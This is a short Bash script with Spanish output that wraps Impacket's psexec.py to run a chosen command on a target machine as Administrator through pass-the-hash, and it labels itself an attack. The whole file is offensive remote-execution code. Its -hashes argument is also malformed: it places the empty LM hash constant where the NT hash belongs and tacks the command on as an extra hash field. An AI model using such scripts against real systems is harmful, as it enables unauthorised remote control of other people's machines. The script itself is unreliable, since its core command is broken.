#!/bin/bash

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <target> <command>"
    echo "Ejemplo: $0 192.168.1.10 'whoami'"
    exit 1
fi

TARGET=$1
COMMAND=$2

echo "Ejecutando Impacket psexec en $TARGET con el comando '$COMMAND'"
psexec.py Administrator@$TARGET -hashes :aad3b435b51404eeaad3b435b51404ee:$COMMAND

echo "Ataque Impacket completado."
